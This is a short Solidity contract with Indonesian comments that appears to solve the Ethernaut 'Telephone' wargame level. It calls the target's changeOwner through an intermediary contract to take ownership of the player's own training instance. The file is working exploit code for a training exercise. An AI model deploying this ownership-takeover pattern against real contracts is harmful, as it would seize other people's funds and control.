// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// 1. Interface kontrak target
interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    ITelephone public targetContract;

    // Masukkan alamat Ethernaut instance Anda saat deploy
    constructor(address _targetAddress) {
        targetContract = ITelephone(_targetAddress);
    }

    // 2. Fungsi untuk menyerang
    function attack() public {
        // Panggil fungsi changeOwner di kontrak target.
        // Masukkan alamat wallet ANDA (msg.sender di sini merujuk ke Anda si pemanggil attack)
        // sebagai pemilik baru.
        targetContract.changeOwner(msg.sender);
    }
}